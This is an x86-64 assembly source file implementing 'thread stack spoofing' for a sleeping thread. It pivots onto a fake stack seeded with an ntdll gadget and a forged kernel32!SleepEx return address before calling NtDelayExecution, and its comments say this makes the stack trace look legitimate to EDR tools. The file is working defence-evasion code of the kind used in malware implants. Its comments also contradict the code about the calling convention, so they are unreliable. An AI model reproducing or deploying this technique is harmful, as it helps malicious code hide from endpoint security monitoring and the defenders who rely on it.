/*
 * spoof_stack_asm.S — Thread Stack Spoofing sleep implementation.
 *
 * Strategy:
 * 1. Save real RSP to frame->real_rsp
 * 2. Switch RSP to fake stack (aligned at +0x58 for 16-byte alignment after call)
 * 3. Call NtDelayExecution (sleep while on fake stack)
 * 4. After return, RSP is still on fake stack
 * 5. Read saved real RSP from fake stack and restore it
 * 6. Return to caller on real stack
 *
 * When EDR walks the stack during sleep:
 *   frame[0] = ntdll ret gadget (RSP points here during NtDelayExecution wait)
 *   frame[1] = saved real RSP (not executed)
 *   frame[2] = SleepEx return address (fake, makes stack trace look legitimate)
 *
 * EDR sees: ntdll!RSP → kernel32!SleepEx + offset → (more frames)
 */

.intel_syntax noprefix
.text
.globl spoof_stack_sleep_asm

/*
 * int spoof_stack_sleep_asm(void* frame, void* ntDelayFn)
 *
 * Arguments (System V AMD64 ABI):
 *   rdi = frame (pointer to SpoofStackFrame on heap)
 *   rsi = ntDelayFn (pointer to NtDelayExecution)
 *
 * Returns:
 *   eax = 0 on success, -1 on failure
 */
spoof_stack_sleep_asm:
    push    rbp
    mov     rbp, rsp

    // ========================================================
    // Save callee-saved registers
    // ========================================================
    push    rbx
    push    r12
    push    r13
    push    r14
    push    r15

    // Save frame ptr and function ptr to callee-saved regs
    mov     r12, rcx          // Windows ABI: 1st arg = frame pointer
    mov     r13, rdx          // Windows ABI: 2nd arg = NtDelayExecution function pointer

    // ========================================================
    // Save real RSP into frame->real_rsp (offset 8)
    // ========================================================
    mov     rax, rsp
    mov     QWORD PTR [r12 + 8], rax

    // ========================================================
    // Switch to fake stack
    // frame+0x58 gives 16-byte aligned RSP after call pushes return addr
    // Layout at fake stack:
    //   +0x00: gadget (ret addr pushed by call)
    //   +0x08: real_rsp (not accessed by NtDelayExecution)
    //   +0x10: sleepex_ret (not accessed by NtDelayExecution)
    //   +0x18-0x38: shadow space (32 bytes)
    //   +0x40: first param (BOOLEAN Alertable)
    //   +0x48: second param (&LARGE_INTEGER) — at rsp+0x28 after call
    //   +0x50: padding
    // ========================================================
    lea     rsp, [r12 + 0x58]

    // ========================================================
    // Setup NtDelayExecution parameters on fake stack
    // NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER Interval)
    //   Arg1 (rcx) = FALSE (0)
    //   Arg2 (rdx) = pointer to LARGE_INTEGER at frame offset 64
    // Shadow space at rsp+0x18 to rsp+0x38
    // Params at rsp+0x40 and rsp+0x48
    // ========================================================
    mov     QWORD PTR [rsp + 0x18], 0        // shadow rcx
    mov     QWORD PTR [rsp + 0x20], 0        // shadow rdx
    mov     QWORD PTR [rsp + 0x28], 0        // shadow r8
    mov     QWORD PTR [rsp + 0x30], 0        // shadow r9

    mov     QWORD PTR [rsp + 0x40], 0        // Alertable = FALSE
    lea     rax, [r12 + 64]                  // address of frame->li
    mov     QWORD PTR [rsp + 0x48], rax      // Interval = &frame->li

    // Set rcx and rdx for the function call
    xor     rcx, rcx                         // Alertable = FALSE
    mov     rdx, rax                         // Interval pointer

    // ========================================================
    // Call NtDelayExecution — sleeps here while on fake stack
    // ========================================================
    call    r13

    // ========================================================
    // After return: we're still on fake stack.
    // Restore real RSP from frame->real_rsp (offset 8).
    // IMPORTANT: must not use stack between here and rsp restore.
    // ========================================================
    mov     rsp, QWORD PTR [r12 + 8]

    // ========================================================
    // Restore callee-saved registers and return
    // ========================================================
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rbx

    xor     eax, eax          // return 0 (success)

    pop     rbp
    ret
